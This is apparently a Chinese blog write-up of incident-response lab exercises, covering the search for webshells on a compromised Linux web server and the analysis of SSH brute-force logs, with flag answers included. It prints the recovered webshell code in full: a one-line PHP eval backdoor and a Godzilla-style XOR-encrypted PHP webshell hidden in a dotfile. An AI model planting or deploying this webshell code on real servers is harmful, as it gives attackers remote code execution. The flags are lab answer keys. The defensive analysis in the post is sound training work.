<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Re:从零开始的玄机的应急响应生活 | 0raN9e's Blog</title><meta name=keywords content="应急响应"><meta name=description content="一些个人的书写记录"><meta name=author content><link rel=canonical href=http://blog.0ran9e.cn/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://blog.0ran9e.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://blog.0ran9e.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://blog.0ran9e.cn/favicon-32x32.png><link rel=apple-touch-icon href=http://blog.0ran9e.cn/apple-touch-icon.png><link rel=mask-icon href=http://blog.0ran9e.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://blog.0ran9e.cn/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://blog.0ran9e.cn/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="Re:从零开始的玄机的应急响应生活"><meta property="og:description" content="一些个人的书写记录"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-02T00:00:00+08:00"><meta property="article:modified_time" content="2025-03-02T00:00:00+08:00"><meta property="article:tag" content="应急响应"><meta name=twitter:card content="summary"><meta name=twitter:title content="Re:从零开始的玄机的应急响应生活"><meta name=twitter:description content="一些个人的书写记录"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://blog.0ran9e.cn/posts/"},{"@type":"ListItem","position":3,"name":"Re:从零开始的玄机的应急响应生活","item":"http://blog.0ran9e.cn/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Re:从零开始的玄机的应急响应生活","name":"Re:从零开始的玄机的应急响应生活","description":"一些个人的书写记录","keywords":["应急响应"],"articleBody":"第一章 应急响应-webshell查杀 靶机账号密码 root xjwebshell 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx} 2.黑客使用的什么工具的shell github地址的md5 flag{md5} 3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx 4.黑客免杀马完整路径 md5 flag{md5} Q1 root@ip-10-0-10-4:~# cd /var/www/html root@ip-10-0-10-4:/var/www/html# ls admin data index.php pictures shell.php wap api.php favicon.ico install.php README.md sitemap.php config.php include LICENSE rss.php template root@ip-10-0-10-4:/var/www/html# cat shell.php \u003c?php phpinfo();@eval($_REQUEST[1]);?\u003e root@ip-10-0-10-4:/var/www/html# find ./ -name \"*.php\" -type f -exec grep -Hn \"eval(\" {} \\; 2\u003e/dev/null ./include/gz.php:23: eval($payload); ./include/Db/.Mysqli.php:22: eval($payload); ./shell.php:1:\u003c?php phpinfo();@eval($_REQUEST[1]);?\u003e 查找危险函数语句\nfind ./ -name \"*.php\" -type f -exec grep -Hn \"eval(\" {} \\; 2\u003e/dev/null root@ip-10-0-10-4:/var/www/html# cat ./include/gz.php \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i","wordCount":"23672","inLanguage":"zh-cn","datePublished":"2025-03-02T00:00:00+08:00","dateModified":"2025-03-02T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.0ran9e.cn/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://blog.0ran9e.cn/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://blog.0ran9e.cn/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://blog.0ran9e.cn/ title=首页><span>首页</span></a></li><li><a href=http://blog.0ran9e.cn/archives/ title=归档><span>归档</span></a></li><li><a href=http://blog.0ran9e.cn/tags/ title=标签><span>标签</span></a></li><li><a href=http://blog.0ran9e.cn/search/ title=搜索><span>搜索</span></a></li><li><a href=http://blog.0ran9e.cn/about/ title=关于><span>关于</span></a></li><li><a href=http://blog.0ran9e.cn/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2025-03-02 00:00:00 +0800 CST'>March 2, 2025</span>&nbsp;·&nbsp;<span>48 min</span><h1 class=post-title>Re:从零开始的玄机的应急响应生活</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=第一章-应急响应-webshell查杀>第一章 应急响应-webshell查杀</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>靶机账号密码 root xjwebshell
</span></span><span style=display:flex><span>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}
</span></span><span style=display:flex><span>2.黑客使用的什么工具的shell github地址的md5 flag{md5}
</span></span><span style=display:flex><span>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx
</span></span><span style=display:flex><span>4.黑客免杀马完整路径 md5 flag{md5}
</span></span></code></pre></div><h2 id=q1>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-4:~# cd /var/www/html
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html# ls
</span></span><span style=display:flex><span>admin       data         index.php    pictures   shell.php    wap
</span></span><span style=display:flex><span>api.php     favicon.ico  install.php  README.md  sitemap.php
</span></span><span style=display:flex><span>config.php  include      LICENSE      rss.php    template
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html# cat shell.php
</span></span><span style=display:flex><span>&lt;?php phpinfo<span style=color:#f92672>()</span>;@eval<span style=color:#f92672>(</span>$_REQUEST<span style=color:#f92672>[</span>1<span style=color:#f92672>])</span>;?&gt;
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html# find ./ -name <span style=color:#e6db74>&#34;*.php&#34;</span> -type f -exec grep -Hn <span style=color:#e6db74>&#34;eval(&#34;</span> <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>./include/gz.php:23:            eval<span style=color:#f92672>(</span>$payload<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>./include/Db/.Mysqli.php:22:            eval<span style=color:#f92672>(</span>$payload<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>./shell.php:1:&lt;?php phpinfo<span style=color:#f92672>()</span>;@eval<span style=color:#f92672>(</span>$_REQUEST<span style=color:#f92672>[</span>1<span style=color:#f92672>])</span>;?&gt;
</span></span></code></pre></div><p>查找危险函数语句</p><pre tabindex=0><code>find ./ -name &#34;*.php&#34; -type f -exec grep -Hn &#34;eval(&#34; {} \; 2&gt;/dev/null
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html# cat ./include/gz.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>@session_start<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>@set_time_limit<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>@error_reporting<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> encode<span style=color:#f92672>(</span>$D,$K<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i<span style=color:#f92672>=</span>0;$i&lt;strlen<span style=color:#f92672>(</span>$D<span style=color:#f92672>)</span>;$i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $c <span style=color:#f92672>=</span> $K<span style=color:#f92672>[</span>$i+1&amp;15<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>        $D<span style=color:#f92672>[</span>$i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $D<span style=color:#f92672>[</span>$i<span style=color:#f92672>]</span>^$c;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $D;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>//027ccd04-5065-48b6-a32d-77c704a5e26d
</span></span><span style=display:flex><span>$payloadName<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;payload&#39;</span>;
</span></span><span style=display:flex><span>$key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;3c6e0b8a9c15224a&#39;</span>;
</span></span><span style=display:flex><span>$data<span style=color:#f92672>=</span>file_get_contents<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;php://input&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>$data!<span style=color:#f92672>==</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    $data<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$data,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>isset<span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>])){</span>
</span></span><span style=display:flex><span>        $payload<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>]</span>,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>strpos<span style=color:#f92672>(</span>$payload,<span style=color:#e6db74>&#34;getBasicsInfo&#34;</span><span style=color:#f92672>)===</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            $payload<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$payload,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                eval<span style=color:#f92672>(</span>$payload<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        echo encode<span style=color:#f92672>(</span>@run<span style=color:#f92672>(</span>$data<span style=color:#f92672>)</span>,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>strpos<span style=color:#f92672>(</span>$data,<span style=color:#e6db74>&#34;getBasicsInfo&#34;</span><span style=color:#f92672>)</span>!<span style=color:#f92672>==</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            $_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>]=</span>encode<span style=color:#f92672>(</span>$data,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><pre tabindex=0><code>//027ccd04-5065-48b6-a32d-77c704a5e26d
</code></pre><h2 id=q2>Q2</h2><p><a href=https://www.cnblogs.com/encapsulation/p/15662851.html>哥斯拉PHP马逐句解析 - 芥末炸弹 - 博客园</a>介绍了内容，去github上找一下</p><pre tabindex=0><code>https://github.com/BeichenDream/Godzilla
39392de3218c333f794befef07ac9257
</code></pre><h2 id=q3>Q3</h2><p>去之前的地方再看看</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html/include# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>4</span> www-data www-data  <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>8</span> www-data www-data  <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> ..
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>1249</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> common.php
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> www-data www-data  <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> Db
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data     <span style=color:#ae81ff>0</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> default.htm
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>15364</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> .DS_Store
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data   <span style=color:#ae81ff>808</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> gz.php
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data     <span style=color:#ae81ff>0</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> index.htm
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data     <span style=color:#ae81ff>0</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> index.html
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> www-data www-data  <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> Model
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html/include# cd Db
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html/include/Db# ls
</span></span><span style=display:flex><span>Mysqli.php  Mysql.php  Sqlite.php
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html/include/Db# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>2</span> www-data www-data <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>4</span> www-data www-data <span style=color:#ae81ff>4096</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> ..
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>768</span> Aug  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2023</span> .Mysqli.php
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4752</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> Mysqli.php
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4921</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> Mysql.php
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>4433</span> Mar <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> Sqlite.php
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/www/html/include/Db# cat .Mysqli.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>@session_start<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>@set_time_limit<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>@error_reporting<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> encode<span style=color:#f92672>(</span>$D,$K<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span><span style=color:#f92672>(</span>$i<span style=color:#f92672>=</span>0;$i&lt;strlen<span style=color:#f92672>(</span>$D<span style=color:#f92672>)</span>;$i++<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        $c <span style=color:#f92672>=</span> $K<span style=color:#f92672>[</span>$i+1&amp;15<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>        $D<span style=color:#f92672>[</span>$i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $D<span style=color:#f92672>[</span>$i<span style=color:#f92672>]</span>^$c;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $D;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$payloadName<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;payload&#39;</span>;
</span></span><span style=display:flex><span>$key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;3c6e0b8a9c15224a&#39;</span>;
</span></span><span style=display:flex><span>$data<span style=color:#f92672>=</span>file_get_contents<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;php://input&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>$data!<span style=color:#f92672>==</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    $data<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$data,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>isset<span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>])){</span>
</span></span><span style=display:flex><span>        $payload<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>]</span>,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>strpos<span style=color:#f92672>(</span>$payload,<span style=color:#e6db74>&#34;getBasicsInfo&#34;</span><span style=color:#f92672>)===</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            $payload<span style=color:#f92672>=</span>encode<span style=color:#f92672>(</span>$payload,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>                eval<span style=color:#f92672>(</span>$payload<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        echo encode<span style=color:#f92672>(</span>@run<span style=color:#f92672>(</span>$data<span style=color:#f92672>)</span>,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span><span style=color:#66d9ef>else</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>strpos<span style=color:#f92672>(</span>$data,<span style=color:#e6db74>&#34;getBasicsInfo&#34;</span><span style=color:#f92672>)</span>!<span style=color:#f92672>==</span>false<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            $_SESSION<span style=color:#f92672>[</span>$payloadName<span style=color:#f92672>]=</span>encode<span style=color:#f92672>(</span>$data,$key<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><pre tabindex=0><code>/var/www/html/include/Db/.Mysqli.php
aebac0e58cd6c5fad1695ee4d1ac1919
</code></pre><h2 id=q4>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-4:/var/log# ls
</span></span><span style=display:flex><span>alternatives.log    auth.log                           btmp.1                 debug       kern.log    mysql           syslog.1
</span></span><span style=display:flex><span>alternatives.log.1  auth.log.1                         cloud-init.log         debug.1     kern.log.1  ntpstats        user.log
</span></span><span style=display:flex><span>amazon              aws114_ssm_agent_installation.log  cloud-init-output.log  dpkg.log    lastlog     php7.3-fpm.log  user.log.1
</span></span><span style=display:flex><span>apache2             bootstrap.log                      daemon.log             dpkg.log.1  messages    private         wtmp
</span></span><span style=display:flex><span>apt                 btmp                               daemon.log.1           faillog     messages.1  syslog
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/log# cd apache2
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/log/apache2# ls
</span></span><span style=display:flex><span>access.log  error.log  other_vhosts_access.log
</span></span><span style=display:flex><span>root@ip-10-0-10-4:/var/log/apache2# cat access.log
</span></span><span style=display:flex><span>192.168.200.2 - - <span style=color:#f92672>[</span>02/Aug/2023:01:42:19 +0000<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /1.php HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>21541</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#e6db74>&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
</span></span><span style=display:flex><span>192.168.200.2 - - <span style=color:#f92672>[</span>02/Aug/2023:01:42:19 +0000<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style=color:#ae81ff>404</span> <span style=color:#ae81ff>492</span> 
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>192.168.200.2 - - <span style=color:#f92672>[</span>02/Aug/2023:08:56:10 +0000<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=ser HTTP/1.1&#34;</span> <span style=color:#ae81ff>500</span> <span style=color:#ae81ff>185</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#e6db74>&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span>
</span></span><span style=display:flex><span>192.168.200.2 - - <span style=color:#f92672>[</span>02/Aug/2023:08:56:24 +0000<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=sert HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> 
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>查找具体位置</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-4:~# find / -name <span style=color:#e6db74>&#34;top.php&#34;</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/var/www/html/wap/top.php
</span></span><span style=display:flex><span>/var/www/html/data/tplcache/top.php
</span></span></code></pre></div><pre tabindex=0><code>/var/www/html/wap/top.php
EEFF2EABFD9B7A6D26FC1A53D3F7D1DE
</code></pre><h1 id=第一章-应急响应-linux日志分析>第一章 应急响应-Linux日志分析</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&#34;,&#34;分割
</span></span><span style=display:flex><span>2.ssh爆破成功登陆的IP是多少，如果有多个使用&#34;,&#34;分割
</span></span><span style=display:flex><span>3.爆破用户名字典是什么？如果有多个使用&#34;,&#34;分割
</span></span><span style=display:flex><span>4.登陆成功的IP共爆破了多少次
</span></span><span style=display:flex><span>5.黑客登陆主机后新建了一个后门用户，用户名是多少
</span></span></code></pre></div><h2 id=q1-1>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Failed password for root&#34;</span> | awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
</span></span></code></pre></div><p><code>awk</code> 用来打印每行的第 11 列。通常，认证日志中的第 11 列会是登录尝试的源 IP 地址（具体列号可能根据日志格式而有所不同）。</p><p><code>uniq</code> 用来去除重复的 IP 地址，并且 <strong><code>-c</code></strong> 选项会在每个唯一的 IP 地址前加上出现次数，表示该 IP 地址失败登录的次数。</p><p>对 <code>uniq -c</code> 输出的结果按次数进行降序排序（<strong><code>-n</code></strong> 表示数值排序，<strong><code>-r</code></strong> 表示降序排序）。这样最多尝试失败的 IP 地址会排在最前面。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:/var/log# cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Failed password for root&#34;</span> | awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>4</span> 192.168.200.2
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>1</span> 192.168.200.32
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>1</span> 192.168.200.31
</span></span></code></pre></div><pre tabindex=0><code>flag{192.168.200.2,192.168.200.31,192.168.200.32}
</code></pre><h2 id=q2-1>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Accepted &#34;</span> | awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
